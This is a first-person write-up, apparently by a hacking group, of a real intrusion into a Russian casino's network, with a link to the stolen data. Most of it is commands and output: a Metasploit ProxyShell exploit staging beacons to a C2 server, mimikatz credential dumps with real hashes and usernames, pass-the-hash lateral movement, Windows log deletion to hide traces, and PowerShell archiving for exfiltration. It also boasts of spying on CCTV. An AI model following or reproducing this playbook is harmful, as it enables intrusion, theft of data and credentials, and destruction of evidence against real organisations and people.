On march 30th 2022, we had published a leak on a large russian casino that is tied to the russian hotel "Shambala"
you can find the leak here: LINK TO LEAK: https://anonfiles.com/38r2e8S5x1/shambala_Poker_JokerClub_zip

Today we come with a writeup on how we preformed this hack from the start to finish!

There is a huge belief amongst many people that say "Casinos are too secure", "Casinos are more secure then a bank", etc etc even when it comes to physical security
but after reading this im sure you will come to a shock as well on how missing just one security patch can lead to us hacking a whole casino!

Initially we were looking for different targets vulnerable to Proxyshell through shodan, specifically in Russia after finding a few targets we manually confirmed the vulnerability (the reasoning for this is due to shodan scans can lead to false positives or even sometimes is outdated completely) and then did more research on the target to confirm what we are attacking!

(the follow NSE script can be used to confirm and scan proxyshell https://github.com/GossiTheDog/scanning/blob/main/http-vuln-exchange-proxyshell.nse)

To our shock we found a hotel that has a large income coming in and out and after further research we found the hotel was in some form tied to the russian government 
all excited we booted up our favorite C2 framework COBALT STRIKE!! (you can find a copy on our telegram channel and if requests we currently give out the crack for free!)
knowing the proxyshell vulnerability is there we also started Metasploit and loaded the proxyshell module, we had no reason to use our personal written exploit as the proxyshell module on metasploit was stable enough and did not have any concerning issues.

## Initial Foothold

### BUT GHOSTSEC HOW CAN WE TURN OUR METASPLOIT SHELL TO COBALT STRIKE?!?!?
This should be the least of your worries at this point, it is fairly easy to do so and here comes our STEP BY STEP guide on getting your victim from metasploit to your C2 framework (this applies to other C2s not just cobalt) 

STEP 1. Set PAYLOAD to windows/meterpreter/reverse_http for an HTTP Beacon. Set PAYLOAD to windows/meterpreter/reverse_https for an HTTPS Beacon. You’re not really delivering Meterpreter here. You’re telling the Metasploit Framework to generate an HTTP (or HTTPS) stager to download a payload from the specified LHOST and LPORT.

STEP 2. set the Lhost and Lport to your cobalt strike listener Cobalt Strike knows what to do when it receives a request from a Metasploit Framework stager.

STEP 3. Set DisablePayloadHandler to True. Set PrependMigrate to True.

STEP 4. PROFIT!!!

```
msf6 > search -u exchange_proxyshell_rce  
[*] Using configured payload windows/x64/meterpreter/reverse_tcp  
  
Matching Modules  
================  
  
  #  Name                                          Disclosure Date  Rank       Check  Description  
  -  ----                                          ---------------  ----       -----  -----------  
  0  exploit/windows/http/exchange_proxyshell_rce  2021-04-06       excellent  Yes    Microsoft Exchange ProxyShell RCE  
  
  
Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/exchange_proxyshell_rce  
  
[*] Using exploit/windows/http/exchange_proxyshell_rce  
msf6 exploit(windows/http/exchange_proxyshell_rce) > options  
  
Module options (exploit/windows/http/exchange_proxyshell_rce):  
  
  Name              Current Setting  Required  Description  
  ----              ---------------  --------  -----------  
  EMAIL                              no        A known email address for this organization  
  Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]  
  RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit  
  RPORT             443              yes       The target port (TCP)  
  SRVHOST           0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.  
  SRVPORT           8080             yes       The local port to listen on.  
  SSL               true             no        Negotiate SSL/TLS for outgoing connections  
  SSLCert                            no        Path to a custom SSL certificate (default is randomly generated)  
  URIPATH                            no        The URI to use for this exploit (default is random)  
  UseAlternatePath  false            yes       Use the IIS root dir as alternate path  
  VHOST                              no        HTTP server virtual host  
  
  
Payload options (windows/x64/meterpreter/reverse_tcp):  
  
  Name      Current Setting  Required  Description  
  ----      ---------------  --------  -----------  
  EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)  
  LHOST                      yes       The listen address (an interface may be specified)  
  LPORT     4444             yes       The listen port  
  
  
Exploit target:  
  
  Id  Name  
  --  ----  
  0   Windows Powershell  
  
  
msf6 exploit(windows/http/exchange_proxyshell_rce) > set rhosts <target_IP>
rhosts => <target_IP>
msf6 exploit(windows/http/exchange_proxyshell_rce) > set lhost <teamserver_C2>
lhost => <teamserver_C2>
msf6 exploit(windows/http/exchange_proxyshell_rce) > set lport 80
lport => 80
msf6 exploit(windows/http/exchange_proxyshell_rce) > set DisablePayloadHandler true
DisablePayloadHandler => true
msf6 exploit(windows/http/exchange_proxyshell_rce) > set PrependMigrate true
PrependMigrate => true
msf6 exploit(windows/http/exchange_proxyshell_rce) > set AllowNoCleanup true
AllowNoCleanup => true
msf6 exploit(windows/http/exchange_proxyshell_rce) > exploit
```

Now that we run the exploit and get our initial shell

![[MSF2Beacon.png]]

We may now move on to POST EXPLOITATION! when we say post exploitation we will cover all the topics from PIVOTING,GAINING PRIVILEGE, AND DATA EXFIL!

## Post Exploitation

A fellow GhostSec Member userware will continue from here and will tell you our process of post exploitation during The Shambala hack!!

### Enumeration and Discovery

After we got initial access we start with a basic internal recon running `net view` just by using APIs without relying on `net.exe`.
Also be sure to remove the webshell that was weaponized with beacon ahead of time. Just do it just in cause user!

```
beacon> net view
received output:
List of hosts:

 Server Name             IP Address                       Platform  Version  Type   Comment
 -----------             ----------                       --------  -------  ----   -------
 ADMIN-REST-01           172.16.2.155                     500       6.1             
 ADMIN-REST-02           172.16.2.121                     500       6.1             
 AQUILA                  172.16.0.20                      500       10.0     PDC    
 BUH1                    172.16.4.154                     500       10.0            
 BUH2                    172.16.4.180                     500       6.1             
 CCTV-3-1                172.16.2.182                     500       10.0            
 CCTV-UPGR               172.16.2.84                      500       10.0            
 CCTV-UPRG2              172.16.2.167                     500       10.0            
 EXEMS                   172.16.0.75                      500       10.0            
 HERCULES                172.16.0.70                      500       10.0            
 HOTELMAN                172.16.2.240                     500       10.0            
 INKASS1                 172.16.20.1                      500       6.1             
 INKASS2                 172.16.20.9                      500       10.0            
 INSTRUCTOR              172.16.3.0                       500       6.1             
 IT-BOOK                 172.16.1.222                     500       6.1             
 ITDEP                   172.16.1.55                      500       10.0            
 JOKERCLUB1              172.16.20.61                     500       6.1             
 JOKERCLUB2              172.16.20.62                     500       10.0            
 KASSA1                  172.16.20.2                      500       6.1             
 KASSA2                  172.16.20.3                      500       6.1             
 KASSA3                  172.16.20.4                      500       6.1             
 LOGIST                  172.16.12.129                    500       10.0            
 MANAGER                 172.16.13.142                    500       10.0            
 MARKETING-02            172.16.2.11                      500       10.0            
 PERSONAL-01             172.16.2.47                      500       10.0            
 PERSONAL-02             172.16.4.24                      500       10.0            
 PERSONAL-03             172.16.2.2                       500       6.1             
 PITBOSS1-1              172.16.20.40                     500       10.0            
 PITBOSS1-2              172.16.3.200                     500       10.0            
 PITBOSS2                172.16.3.165                     500       10.0            
 PITBOSSGOLD             172.16.4.4                       500       10.0            
 PITBOSSOFFICE           172.16.3.86                      500       6.1             
 PITBOSSVIP              172.16.20.125                    500       6.1             
 POKERCLUB-PC            172.16.2.181                     500       10.0            
 PRODMAN                 172.16.2.123                     500       6.1             
 RDPSRV                  172.16.0.77                      500       10.0            
 REC1                    172.16.20.21                     500       6.1             
 REC2                    172.16.20.22                     500       10.0            
 REC3                    192.168.0.79                     500       6.1             
 REC4                    172.16.20.24                     500       6.1             
 REGSTAT2                172.16.20.26                     500       6.1             
 REGVIP                  172.16.20.27                     500       6.1             
 SHEF                    172.16.2.202                     500       6.1             
 SHEFKONDITER            172.16.10.9                      500       6.1             
 SKLAD3                  172.16.2.23                      500       6.1             
 SLOTBOSS                172.16.3.199                     500       10.0            
 SLOTMANAGER             172.16.13.138                    500       6.1             
 TECHNOLOG               172.16.3.134                     500       6.1             
 TS-3                    172.16.20.241                    500       10.0            
 TS-5                    172.16.4.53                      500       10.0            
 ULYA_URASKINA           172.16.2.128                     500       6.1             
 URIST                   172.16.5.112                     500       6.1             
 VEEAMVCENTER            172.16.0.59                      500       6.3             
 ZAV-SKLAD-L2            172.16.3.103                     500       6.1

beacon> rm C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Fr7kkADqp.aspx
```

Looks like we have a total of 55 computers to hop around in the network Normally you should run `getuid` beacon command that even metasploit comes with to understand
what privileges you're in however it wasn't necessary to do it since Cobalt Strike has a nice GUI frontend that tell us we are `NT AUTHORITY\SYSTEM` so the next step before
we continue on lateral movement and **Privilege Escalation** wasn't an issue for us, we have to dump the credentials using API`hashdump` or mimikatz shortcut
command in beacon `logonpasswords`.

```
beacon> logonpasswords
[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[+] host called home, sent: 296206 bytes
[+] received output:

Authentication Id : 1 ; 2658188168 (00000001:9e70bb88)  
Session           : NewCredentials from 0  
User Name         : SYSTEM  
Domain            : NT AUTHORITY  
Logon Server      : (null)  
Logon Time        : 3/23/2022 6:34:04 PM  
SID               : S-1-5-18  
       msv :      
        [00000003] Primary  
        * Username : Administrator  
        * Domain   : EXEMS  
        * NTLM     : f650a2ecaa6d7ed6937ad3934faef2b9  
       tspkg :    
       wdigest :          
        * Username : Administrator  
        * Domain   : EXEMS  
        * Password : (null)  
       kerberos :         
        * Username : Administrator  
        * Domain   : EXEMS  
        * Password : (null)  
       ssp :      
       credman :
..[snip]..
```

With that the credentials are stored in Cobalt Strike teamserver (the C&C). Now we can start island hopping (pivoting) the machines
one by one. You're suppose to have SMB listener setup to connect with other Windows workstations on the active directory network.
But before I even do that I was geniuely curious of what Antivirus or EDRs they have installed on their machines. I've ran
`Seatbelt.exe` to enumerate Microsoft Exchange server from the initial foothold and this what suprised me.

```
beacon> execute-assembly /home/userware/csharp-tools/Privesc/Seatbelt.exe -group=all
[*] Tasked beacon to run .NET program: Seatbelt.exe -group=all
[+] host called home, sent: 661567 bytes
..[snip]..
====== WindowsDefender ======  

Locally-defined Settings:

 Path Exclusions:
   C:\Windows  -> LOOOOOOL!!!!!!

 PolicyManagerPathExclusions:
   C:\Windows  -> LOOOOOOL!!!!!!



GPO-defined Settings:  
  
 Path Exclusions:  
   C:\ProgramData\Oracle\Java  
   C:\Windows  -> LOOOOOOL!!!!!!
  
 PolicyManagerPathExclusions:  
   C:\ProgramData\Oracle\Java  
   C:\Windows  -> LOOOOOOL!!!!!!
..[snip]..

```

I was laughing my ass off and great thing about this configuration we didn't have to give away our prepared malware so we can hop all around
network freely.Thanks you lazy admin I hope your boss will be happy about this. Normally on every red team assessment you gotta at least
prepare payloads to evade Antivirus or any EDR (Endpoint) solutions. On Cobalt Strike you must have the `artifacts` and `resources` that the vendor
supplies with it.

Now for lateral movement stage. First you must check what credentials on every machine you discover you can do this
to run on beacon command with `net user \\<IP>`. However, I had a quicker solution so we don't have to run it every single time since I like
to test things because why not user? All thanks to __*byt3bl33d3r*__ for making `crackmapexec` to check which credentials have administrative
privileges. Most penetration testing distributions have this preinstalled if not you can just run `sudo apt install crackmapexec`.

First I run SOCKS4A on the teamserver:
```
beacon> socks 8888
[*] started SOCKS4a server on: 8888
```

Edit the `proxychains.conf` file and edit it at the last line to include your C2 (the teamserver) IP address (you can use `nano` instead to make your life easier user)
```
$ vim /etc/proxychains.conf

socks4	<C2_IP> 8888
```

While the SOCKS Proxy server is up and running now we need to interact Cobalt Strike and check with credentials one by one
which you can navigate it on the toolbar easily. Go to **View** -> **Credentials** then select one of them and click **Edit** then copy the username and the NT hash to perform
**Pass the Hash** technique.

Then execute it with `crackmapexec` but run it as root!

```
$ sudo -s
# proxychains -q crackmapexec smb -u <username> -H <nt_hash> -d <domain> <IP>/<CIDR>
```

Here's what it looks like:

![[crackmapexec-creds-pth-test.png]]

With that we can run `psexec` (32-bit), `psexec_psh` (powershell one-liner 32-bit) or `psexec64` (64-bit) and the following syntax looks like this:

`beacon> jump <exploit> <IP> <listener>`

Now for whatever the reason is why SMB beacon bind shells just don't work on these machines during the time. I thought it could be
something that isn't configured properly to communite between the peers we use just used HTTP listener to pop the machines and it works.
Weird but I'm not sysadmin I just like to penetrate their networks and fuck it up when I see it lulz.

```
beacon> pth SHMC\sergeev.ma 924ec7e19e5de227b76184d71a231c1b
[*] Tasked beacon to run mimikatz's sekurlsa::pth /user:sergeev.ma /domain:SHMC /ntlm:924ec7e19e5de227b76184d71a231c1b /run:"%COMSPEC% /c echo 973013b9c69 > \\.\pipe\  
ac4b72" command
[+] host called home, sent: 31 bytes
beacon> jump psexec_psh RDPSRV sex
[*] Tasked beacon to run windows/beacon_http/reverse_http (173.249.45.143:80) on RDPSRV via Service Control Manager (PSH)
[+] received output:
Started service bc26d6d on RDPSRV
[+] received output:
user    : sergeev.ma  
domain  : SHMC  
program : C:\Windows\system32\cmd.exe /c echo 973013b9c69 > \\.\pipe\ac4b72  
impers. : no  
NTLM    : 924ec7e19e5de227b76184d71a231c1b  
 |  PID  12064  
 |  TID  16624  
 |  LSA Process is now R/W  
 |  LUID 1 ; 2665784146 (00000001:9ee4a352)  
 \_ msv1_0   - data copy @ 000001E8E06E0290 : OK !  
 \_ kerberos - data copy @ 000001E8E02457D8  
  \_ aes256_hmac       -> null                
  \_ aes128_hmac       -> null                
  \_ rc4_hmac_nt       OK  
  \_ rc4_hmac_old      OK  
  \_ rc4_md4           OK  
  \_ rc4_hmac_nt_exp   OK  
  \_ rc4_hmac_old_exp  OK  
  \_ *Password replace @ 000001E8E1E15B48 (32) -> null
```

And we've got a new beacon session! If you view on **Event Logs** Tab

```
<REDACTED> *** initial beacon from СИСТЕМА *@172.16.0.77 (RDPSRV)
```

Thankfully Cobalt Strike can let us automate this by selecting the targets by going through **View** -> **Targets** then we select a
windows workstation with that IP address from `crackmapexec` that we've executed previously then press **Right-Click** -> **Jump** -> **psexec64**
or **winrm64** or **psexec_psh**. it'll automate the beacon commands for you which is convenient for UX (user experience).
So use this everytime when you perform active directory network.

Now here comes the fun part. Once you've kept hopping around the network you have take screenshots in order to understand
what's going on like think of it has a quick recon of the target is doing on his computer. If not then we move on to the next phase
for data exfilitration to look for files that stands out. Also before you type `exit` and found what you're looking for be sure to clear your
trace ahead of time since the forensic units or some tech savvy guy to look for traces and report your C2 server.

```
beacon> screenshot
[*] Tasked beacon to take screenshot
[+] host called home, sent: 199779 bytes
[+] received screenshot from СИСТЕМА (437kb)

beacon> shell del %windir%\*.log /a /s /q /f
[*] Tasked beacon to run: del %windir%\*.log /a /s /q /f
[+] host called home, sent: 61 bytes
[+] received output:
Удален файл - C:\Windows\DirectX.log
Удален файл - C:\Windows\DPINST.LOG
Удален файл - C:\Windows\DtcInstall.log
Удален файл - C:\Windows\lsasetup.log
Удален файл - C:\Windows\PFRO.log
Удален файл - C:\Windows\setupact.log
Удален файл - C:\Windows\setuperr.log
Удален файл - C:\Windows\WindowsUpdate.log
C:\Windows\appcompat\Programs\Amcache.hve.LOG1
..[snip]..

beacon> exit
[*] Tasked beacon to exit
[+] host called home, sent: 8 bytes
[+] beacon exit.
```

Go to **View** -> **Screenshots**

We can see you users ;)

![[screen_a6798773_1106456564.jpg]]


```
beacon> screenshot
[*] Tasked beacon to take screenshot
[+] host called home, sent: 199779 bytes
received screenshot of Program Manager from система (181kb)
```

Why the fuck do you have Windows 7 devices installed to this day and age users? I get it if you're using it for malware
analysis purposes or creating malware in a VM.
I just can't help why. Just install GNU+Linux on your machines if you want to save money!

![[screen_c521df38_825562406.jpg]]

### Data Exfiltration

Alright that's enough of my rambling. While we're popping new beacon sessions and took screenshots as we go. We found some particular names that does stands out ot us
after perform the first phase for internal recon and we had to look at the targets list like **POKERCLUB-PC**, **JOKERCLUB1**, **JOKERCLUB2**, **CCTV-UPGR**, **CCTV-UPRG2**,
**HERCULES**, etc. You may have seen our posts on telegram channel (https://t.me/GhostSecc) as you can tell it's the CCTV footages from those Windows workstations
and it was fun spying people from someone's computer lulz.

Now this is where the fun part or boring part or however you like to take it. Data exfiltration phase! It can be a quite daunting task and yes it is. Doing it manually through the
**Right-Click** -> **File Browser** just doesn't feel productive at all and who knows how many files you'll have to download them either through your main C&C or a dedicated server
to store the loot. This is why the command line is more powerful than you think user. It's handy when it comes with these situations after taking extensive notes to do a powershell
one-liner to enumerate how many files are found and what file extension files we need to look for. Since this is a Casino they only have documents just like most businesses nomally
does.

Let's take **POKERCLUB-PC** as an example. He was working on the spreadsheet file and it incidents this compromised host may contain sensitive documents.

![[screen_9812d886_874469498.jpg]]

After looking through the **File Browser** at the compromised workstation. We had to the check if there are more drives by clicking **List Drives** to
enumerate the machine even further. Look for mounts other than the default `C:\` drive. We saw `C:\PokerClub` and this is what it looks like.

```
beacon> shell dir /s C:\PokerClub
[*] Tasked beacon to run: dir /s C:\PokerClub
[+] host called home, sent: 50 bytes
[+] received output:
 Том в устройстве C имеет метку Windows 10
 Серийный номер тома: 0EB8-A421

 Содержимое папки C:\PokerClub

Вт 15.03.22  21:26    <DIR>          .
Вт 15.03.22  21:26    <DIR>          ..
Пн 10.01.22  04:22    <DIR>          2022 подготовка
Сб 29.01.22  09:03    <DIR>          backgground
Пт 06.08.21  07:54    <DIR>          BACKUP
Чт 02.12.21  04:14           120 448 Freebuy (4lvl)+Double Addon (12 по 20)new.tdt
Ср 03.11.21  01:23        16 527 754 FS Capture 9.7 portable FULL.exe
Ср 23.03.22  16:52    <DIR>          FSCapture9.7
Пн 06.12.21  22:31            47 160 IMPORT.csv
Ср 03.11.21  07:57            91 016 RPT _IPC_Minsk_May_2021_Structure.pdf
Пт 17.12.21  09:38    <DIR>          SPT
Чт 02.12.21  04:13    <DIR>          SPT #2
Вс 15.08.21  11:11    <DIR>          TEMPLATES
Вт 01.02.22  01:43    <DIR>          Архив
Вт 09.11.21  05:17    <DIR>          Разобрать
Вт 01.03.22  23:49         2 003 207 Рега ПУСТАЯ.xlsx
Сб 15.01.22  21:06    <DIR>          Результативность
Сб 05.03.22  04:34    <DIR>          Статистика
Пн 27.12.21  07:12           347 695 Статистика 2022.xlsx
Ср 15.12.21  08:42            19 482 Структура SPT1.xlsx
Пт 18.03.22  18:37    <DIR>          Табрисов
Вс 21.11.21  14:22    <DIR>          Фото
Ср 02.02.22  06:42    <DIR>          Ханевич
Вс 13.03.22  22:56    <DIR>          Яицкий
               7 файлов     19 156 762 байт

 Содержимое папки C:\PokerClub\2022 подготовка

Пн 10.01.22  04:22    <DIR>          .
Пн 10.01.22  04:22    <DIR>          ..
Пн 20.12.21  20:21            25 011 Primorye CUP.xlsx
Чт 30.12.21  23:12            18 589 График и план.xlsx
Пт 24.12.21  12:00            12 056 закрытие.xlsx
Пт 24.12.21  13:37            52 714 Замечания и Оценки 2022.xlsx
Пт 17.12.21  13:43           142 019 Каунт и рассадка.xlsx
Пт 12.11.21  23:11         1 572 501 Рега Пустая 2.xlsx
Вс 12.12.21  20:24         1 611 651 Рега Пустая с макро.xlsm
Пн 27.12.21  07:06         1 378 609 Рега пустая.xlsx
Вс 24.10.21  11:51         1 699 986 Рега тест.xlsx
Пн 20.12.21  20:21           561 082 Рейтинг  МТТ.xlsx
Ср 01.12.21  03:43           479 039 Рейтинг CASH.xlsx
Пн 20.12.21  04:07           347 712 Статистика 2022.xlsx
              12 файлов      7 900 969 байт

 Содержимое папки C:\PokerClub\backgground

Сб 29.01.22  09:03    <DIR>          .
Сб 29.01.22  09:03    <DIR>          ..
Чт 09.09.21  01:43           763 463 1.jpg
Вт 14.12.21  07:46           816 272 111.jpg
Чт 09.09.21  01:43           849 456 222.jpg
Чт 09.09.21  00:54         2 791 413 5.jpg
Чт 09.09.21  01:43           694 513 black light.jpg
Чт 09.09.21  01:43           762 104 blue light.jpg
Чт 16.12.21  02:05         2 867 158 GRAND.jpg
Чт 16.12.21  04:13         3 573 491 knock 2.jpg
Чт 16.12.21  04:13         2 251 233 knock.jpg
Ср 22.12.21  13:24         1 946 752 MAIN Day A.jpg
Ср 22.12.21  13:24         1 947 558 MAIN Day B.jpg
Ср 22.12.21  13:24         1 939 207 MAIN Final day.jpg
Чт 09.09.21  00:54           885 716 белый.jpg
Сб 29.01.22  04:22           814 889 БМт.jpg
Чт 09.09.21  00:58           558 679 бордовый.jpg
Чт 09.09.21  00:54           595 640 зеленый.jpg
Чт 09.09.21  00:54           603 362 синий.jpg
Чт 09.09.21  00:54           584 627 черный.jpg
Чт 16.12.21  03:04         2 826 884 экран Grand A.jpg
Чт 16.12.21  03:04         2 821 108 экран Grand B.jpg
Чт 16.12.21  03:04         2 835 831 экран Grand Final.jpg
Пт 14.01.22  04:07           915 084 Экран PC.jpg
Чт 16.12.21  02:42         2 944 149 экран мини.jpg
Сб 30.10.21  00:12         1 196 980 экран фест.jpg
              24 файлов     38 785 569 байт

 Содержимое папки C:\PokerClub\BACKUP

Пт 06.08.21  07:54    <DIR>          .
Пт 06.08.21  07:54    <DIR>          ..
Пт 06.08.21  07:11         1 430 625 Рега Август.xlsx
Ср 04.08.21  04:36           225 949 Рейтинг  МТТ.xlsx
Пн 02.08.21  23:54           181 285 Рейтинг CASH.xlsx
Пт 06.08.21  07:11           251 825 Статистика.xlsx
               4 файлов      2 089 684 байт
..[snip]..
 Содержимое папки C:\PokerClub\SPT

Пт 17.12.21  09:38    <DIR>          .
Пт 17.12.21  09:38    <DIR>          ..
Вт 14.12.21  04:43           110 763 Freerol Sat to Grand Day 1A (6 по 15) NEW.tdt
Пт 03.12.21  07:34           104 999 Freerol Sat to Grand Day 1A (8 по 15) NEW.tdt
Сб 11.12.21  08:18           113 854 Freeroll sat to MAIN Day A ( 6 по 15) red.tdt
Ср 15.12.21  08:22           111 703 GRAND Day A-B (10 по 25).tdt
Пт 17.12.21  09:38           115 011 MAIN Day A(10 по 20)- 2.tdt.txt
Чт 02.12.21  04:11           115 011 MAIN Day A(10 по 20).tdt
Ср 15.12.21  07:50           114 660 MAIN Day B(10 по 25).tdt
Ср 15.12.21  07:48           114 015 MAIN FINAL (10 по 30).tdt
Ср 15.12.21  08:07           115 614 MINI Event (12 по 30) blue.tdt
Пт 03.12.21  08:04           104 480 Satellie to Grand Day 1B (6 по 15) NEW.tdt
Вт 14.12.21  07:30           106 064 Satellie to Grand FINAL (6 по 15) red.tdt
Вт 14.12.21  07:38           106 703 Satellie to Grand FINAL (8 по 15) red 2000.tdt
Вт 14.12.21  08:13           105 057 Satellite to MAIN Day B ( 8 по 15) red.tdt
Вт 14.12.21  08:11           105 180 Satellite to MAIN Day B ( 8 по 15) СВЕТЛАЯ.tdt
Пт 03.12.21  07:56           104 457 Satellite to MINI Event ( 6 по 15) red.tdt
              15 файлов      1 647 571 байт
```

There are some file extensions like `.tdt` that we didn't recognize it but it does have something to do with the casino. However, when I do quick search it's nothing more but a thumbnail
but I could wrong about that since there could something else we could done. Let us know if you can give us tips for the next Casino hack users! Any feedback will be much appreciated :)

Of course we can't just download everything we have to take what's important to us! We only take documents and images since it's a casino unless we've discovered a custom software
that was made for it and steal the source code from the developer ;)

Good thing I don't have to do any calculations to determine the size of how much data we to extract. I just started archiving to each file extensions that is separated and it wasn't much
really like each of them are a total of between **200MB** - **700MB** of compressed size. Of course you would tell me to install 7zip program on the target's computer but this isn't much a big
deal and it's a doable for us. The point is in red teaming is to be slient and minimize the trace to make it easier to clear your tracks.

First we create a new folder through the temp directory `C:\Windows\Temp\` and run this powershell one-liner that will pipe it to `Compress-Archive` to each file extensions we want to archive.
These are the following file extensions based on our enumeration phase: `.doc`, `.docx`, `.docm`, `.xls`, `.xlsx`, `.xlsm`, `.csv`, `.pdf`, and `.tdt`

Good thing about the `Get-ChildItem` (alias `gci`) that the `-Filter` flag matches the strings that starts with the beginning of the characters `-Filter *.doc` so I don't have to repeat it again
due to the context the filters the specific strings so I can move changing `*.doc` to `*.xls`. Talk about basic regular expression 101.

```

beacon> mkdir C:\Windows\Temp\junk
[*] Tasked beacon to make directory C:\Windows\Temp\junk
[+] host called home, sent: 38 bytes

beacon> powershell gci -recurse -path C:\PokerClub -filter *.pdf | compress-archive -destinationpath C:\Windows\Temp\junk\junk-adobe.zip -compressionlevel optimal -force
[*] Tasked beacon to run: gci -recurse -path C:\PokerClub -filter *.pdf | compress-archive -destinationpath C:\Windows\Temp\junk\junk-adobe.zip -compressionlevel optimal -force
[+]host called home, sent: 463 bytes
[+] received output:
..[snip]..

beacon> powershell gci -recurse -path C:\PokerClub -filter *.xls | compress-archive -destinationpath C:\Windows\Temp\junk\junk-spreadsheets.zip -compressionlevel optimal -force
[*] Tasked beacon to run: gci -recurse -path C:\PokerClub -filter *.xls | compress-archive -destinationpath C:\Windows\Temp\junk\junk-spreadsheets.zip -compressionlevel optimal -force
[+] host called home, sent: 483 bytes
[+] received output:
..[snip]..

beacon> powershell gci -recurse -path c:\ -filter *.csv | compress-archive -destinationpath C:\Windows\Temp\junk\csv-files.zip -compressionlevel optimal -force
[*] Tasked beacon to run: gci -recurse -path c:\ -filter *.csv | compress-archive -destinationpath C:\Windows\Temp\junk\csv-files.zip -compressionlevel optimal -force
[+]host called home, sent: 645 bytes
[+] received output:
..[snip]..

beacon> powershell gci -recurse -path c:\ -filter *.tdt | compress-archive -destinationpath C:\Windows\Temp\junk\maintance.zip -compressionlevel optimal -force
[*] Tasked beacon to run: gci -recurse -path c:\ -filter *.tdt | compress-archive -destinationpath C:\Windows\Temp\junk\maintance.zip -compressionlevel optimal -force
[+]host called home, sent: 645 bytes
[+] received output:
..[snip]..
```

Sometimes I recieve errors that either true or false positive from powershell depending on whatever the reason why Windows is
being a bitch so I had include and remove `-Force` so you're gonna have to deal with a bit trial and error and it won't be an issue. So keep that in mind user.

Now we download them and remove the archived files and the `junk` folder

```
beacon> download C:\Windows\Temp\junk\csv-files.zip
[*] Tasked beacon to download C:\Windows\Temp\junk\csv-files.zip
beacon> download C:\Windows\Temp\junk\maintance.zip
[*] Tasked beacon to download C:\Windows\Temp\junk\maintance.zip
[+] host called home, sent: 84 bytes
[+] started download of C:\Windows\Temp\junk\csv-files.zip (374501 bytes)


[+] started download of C:\Windows\Temp\junk\maintance.zip (2454197 bytes)


[+] download of csv-files.zip is complete

[+] download of maintance.zip is complete

beacon> rm C:\Windows\Temp\junk\csv-files.zip
[*] Tasked beacon to remove C:\Windows\Temp\junk\csv-files.zip
beacon> rm C:\Windows\Temp\junk\maintance.zip
[*] Tasked beacon to remove C:\Windows\Temp\junk\maintance.zip
[+]  host called home, sent: 122 bytes
beacon> rm C:\Windows\Temp\junk
[*] Tasked beacon to remove C:\Windows\Temp\junk
[+]  host called home, sent: 61 bytes
```

Sadly not all of them were archived and I had to give up on it. Not everything works users :(
However, to the rest of the machines we got enough documents we were looking for but I had to spend looking around until we've
pwned all the machines on the active directory network.

Finally the **domain controller (DC)** I thought I've finally pwned the whole network but what I didn't expect is the DC is blocking
the beacon from executing it which took me minutes to realize this that **Windows Defender** is actually active on the domain
controller. At first I had to list the files on `C$` share on **AQUILA** which I can upload the beacon shell. Then execute it remotely and
then nothing happens.

```
beacon> ls \\AQUILA\C$
[*] Tasked beacon to list files in \\AQUILA\C$
[+] host called home, sent: 29 bytes
\\AQUILA\C$\*  
D       0       11/26/2021 21:43:28     $Recycle.Bin  
F       384322  07/16/2016 23:18:08     bootmgr  
F       1       07/16/2016 23:18:08     BOOTNXT  
D       0       11/13/2020 21:30:11     Distrib  
D       0       10/06/2020 22:11:30     Documents and Settings  
D       0       06/17/2021 08:08:42     ExchangeCert  
D       0       10/28/2020 22:54:15     inetpub  
D       0       10/09/2020 08:29:13     LdapAdmin  
D       0       10/28/2020 23:06:10     Logs  
D       0       10/26/2020 16:12:10     MSOCache  
F       4414324736      03/17/2022 21:08:41     pagefile.sys  
D       0       10/07/2020 03:26:41     PerfLogs  
D       0       09/01/2021 22:03:05     Program Files  
D       0       10/28/2020 23:08:00     Program Files (x86)  
D       0       03/24/2022 06:25:40     ProgramData  
D       0       10/06/2020 22:11:32     Recovery  
D       0       10/07/2020 03:48:23     System Volume Information  
D       0       11/26/2021 21:43:18     Users  
D       0       03/24/2022 08:52:54     Windows  
D       0       10/08/2020 23:58:52     zabbix_agent  
F       55386   11/21/2021 23:14:42     zabbix_agentd.log


beacon> rev2self  
[*] Tasked beacon to revert token  
beacon> pth SHMC\sergeev.ma 924ec7e19e5de227b76184d71a231c1b  
[*] Tasked beacon to run mimikatz's sekurlsa::pth /user:sergeev.ma /domain:SHMC /ntlm:924ec7e19e5de227b76184d71a231c1b /run:"%COMSPEC% /c echo 9d894ea6456 > \\.\pipe\1f6e26" command  
[+] host called home, sent: 31 bytes  
beacon> jump psexec64 AQUILA sex  
[*] Tasked beacon to run windows/beacon_http/reverse_http (173.249.45.143:80) on AQUILA via Service Control Manager (\\AQUILA\ADMIN$\1be690b.exe)
[+] host called home, sent: 296055 bytes   
Impersonated NT AUTHORITY\SYSTEM  
  
03/23 22:52:49 UTC [output]  
received output:  
user    : sergeev.ma  
domain  : SHMC  
program : C:\Windows\system32\cmd.exe /c echo 9d894ea6456 > \\.\pipe\1f6e26  
impers. : no  
NTLM    : 924ec7e19e5de227b76184d71a231c1b  
 |  PID  24960  
 |  TID  23900  
 |  LSA Process is now R/W  
 |  LUID 1 ; 2706187083 (00000001:a14d234b)  
 \_ msv1_0   - data copy @ 000001E8E12B2450 : OK !  
 \_ kerberos - data copy @ 000001E8E00A6B18  
  \_ aes256_hmac       -> null                
  \_ aes128_hmac       -> null                
  \_ rc4_hmac_nt       OK  
  \_ rc4_hmac_old      OK  
  \_ rc4_md4           OK  
  \_ rc4_hmac_nt_exp   OK  
  \_ rc4_hmac_old_exp  OK  
  \_ *Password replace @ 000001E8E1FAFCE8 (32) -> null  
  
  
[+] host called home, sent: 291366 bytes  
[-] Could not start service 1be690b on AQUILA: 225

beacon> cd C:\windows\temp  
[+] host called home, sent: 23 bytes  
beacon> upload /home/userware/system.exe  
[*] Tasked beacon to upload /home/userware/system.exe as system.exe
[+] host called home, sent: 288278 bytes

beacon> shell copy system.exe \\AQUILA\C$\  
[*] Tasked beacon to run: copy system.exe \\AQUILA\C$\  
[+] host called home, sent: 59 bytes  
[+] received output:  
       1 file(s) copied.  
  
  
